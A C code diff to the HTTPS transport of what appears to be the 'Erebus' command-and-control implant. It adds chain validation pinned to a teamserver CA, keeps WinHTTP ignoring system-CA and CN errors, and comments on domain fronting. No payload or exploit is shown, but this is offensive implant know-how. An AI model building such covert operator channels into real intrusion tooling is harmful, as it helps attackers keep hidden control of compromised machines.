@@ -39,6 +39,12 @@ static PCCERT_CONTEXT load_pinned_ca(void) {
     return ca;
 }
 
+/*
+ * Chain-validate the server cert against the embedded teamserver CA only.
+ * Checks: signature path to pinned CA, time validity, and serverAuth EKU.
+ * WinHttp still ignores system CA/CN (private CA + optional domain fronting);
+ * this function is the trust decision.
+ */
 static int verify_server_cert_pinned(HINTERNET request) {
     PCCERT_CONTEXT server = NULL;
     DWORD server_len = sizeof(server);
@@ -51,18 +57,88 @@ static int verify_server_cert_pinned(HINTERNET request) {
         return 0;
     }
 
-    BOOL ok = CryptVerifyCertificateSignatureEx(0,
-        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
-        CRYPT_VERIFY_CERT_SIGN_SUBJECT_CERT,
-        (void *)server,
-        CRYPT_VERIFY_CERT_SIGN_ISSUER_CERT,
-        (void *)ca,
-        0,
-        NULL);
+    int ok = 0;
+    HCERTSTORE store = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, 0, NULL);
+    if (!store) goto out;
 
+    if (!CertAddCertificateContextToStore(store, ca, CERT_STORE_ADD_ALWAYS, NULL)) {
+        CertCloseStore(store, 0);
+        goto out;
+    }
+
+    CERT_ENHKEY_USAGE eku;
+    LPSTR eku_oids[1];
+    eku_oids[0] = szOID_PKIX_KP_SERVER_AUTH;
+    eku.cUsageIdentifier = 1;
+    eku.rgpszUsageIdentifier = eku_oids;
+
+    CERT_CHAIN_PARA para;
+    memset(&para, 0, sizeof(para));
+    para.cbSize = sizeof(para);
+    para.RequestedUsage.dwType = USAGE_MATCH_TYPE_AND;
+    para.RequestedUsage.Usage = eku;
+
+    PCCERT_CHAIN_CONTEXT chain = NULL;
+    /* Use current time (pTime=NULL). Additional store holds only our CA. */
+    if (!CertGetCertificateChain(
+            NULL,
+            server,
+            NULL,
+            store,
+            &para,
+            0, /* no online revocation — lab CAs often lack OCSP/CRL */
+            NULL,
+            &chain) || !chain) {
+        CertCloseStore(store, 0);
+        goto out;
+    }
+
+    DWORD err = chain->TrustStatus.dwErrorStatus;
+    /* Accept only clean chains or UNTRUSTED_ROOT that we prove is our CA. */
+    const DWORD allowed = CERT_TRUST_IS_UNTRUSTED_ROOT | CERT_TRUST_IS_PARTIAL_CHAIN | CERT_TRUST_REVOCATION_STATUS_UNKNOWN | CERT_TRUST_IS_OFFLINE_REVOCATION;
+    DWORD fatal = err & ~allowed;
+    if (fatal == 0) {
+        /* Ensure chain ends at (or includes) our pinned CA by comparing public key / cert. */
+        if (chain->cChain > 0 && chain->rgpChain[0]->cElement > 0) {
+            DWORD n = chain->rgpChain[0]->cElement;
+            PCCERT_CONTEXT root = chain->rgpChain[0]->rgpElement[n - 1]->pCertContext;
+            if (root && ca->cbCertEncoded == root->cbCertEncoded
+                && memcmp(ca->pbCertEncoded, root->pbCertEncoded, ca->cbCertEncoded) == 0) {
+                ok = 1;
+            } else if (n >= 2) {
+                /* Intermediate path: leaf signed under CA as issuer of element 0 */
+                PCCERT_CONTEXT issuer = chain->rgpChain[0]->rgpElement[1]->pCertContext;
+                if (issuer && ca->cbCertEncoded == issuer->cbCertEncoded
+                    && memcmp(ca->pbCertEncoded, issuer->pbCertEncoded, ca->cbCertEncoded) == 0) {
+                    ok = 1;
+                }
+            }
+            /* Direct: CryptVerify that server is signed by CA if chain match failed */
+            if (!ok) {
+                if (CryptVerifyCertificateSignatureEx(0,
+                        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
+                        CRYPT_VERIFY_CERT_SIGN_SUBJECT_CERT, (void *)server,
+                        CRYPT_VERIFY_CERT_SIGN_ISSUER_CERT, (void *)ca,
+                        0, NULL)) {
+                    /* Still require time-valid leaf */
+                    if ((err & (CERT_TRUST_IS_NOT_TIME_VALID | CERT_TRUST_IS_NOT_TIME_NESTED)) == 0)
+                        ok = 1;
+                }
+            }
+        }
+    }
+
+    /* Explicitly reject expired / not-yet-valid */
+    if (ok && (err & (CERT_TRUST_IS_NOT_TIME_VALID | CERT_TRUST_IS_NOT_TIME_NESTED)))
+        ok = 0;
+
+    CertFreeCertificateChain(chain);
+    CertCloseStore(store, 0);
+
+out:
     CertFreeCertificateContext(ca);
     CertFreeCertificateContext(server);
-    return ok ? 1 : 0;
+    return ok;
 }
 
 static int https_post(https_ctx *ctx, const wchar_t *path, const uint8_t *body, size_t body_len, uint8_t **resp, size_t *resp_len) {
@@ -79,11 +155,16 @@ static int https_post(https_ctx *ctx, const wchar_t *path, const uint8_t *body, 
         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!request) { WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return 0; }
 
-	if (ctx->use_tls && EREBUS_CA_CERT_PEM[0] != '\0') {
-		DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-			SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-		WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
-	}
+    if (ctx->use_tls && EREBUS_CA_CERT_PEM[0] != '\0') {
+        /*
+         * Private teamserver CA is not in the system trust store; domain fronting
+         * may make CN/SAN mismatch. Ignore only system CA + CN — never ignore
+         * date. Custom chain validation below is the real trust gate.
+         */
+        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+            SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
+    }
 
     if (ctx->cdn_host[0]) {
         WinHttpAddRequestHeaders(request, ctx->cdn_host, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
@@ -182,6 +263,7 @@ static const erebus_transport_ops https_ops = {
     https_register,
     https_beacon,
     https_destroy,
+    NULL, /* set_session_id: HTTPS does not store session in transport ctx */
 };
 
 int erebus_transport_create_https(erebus_transport **out) {
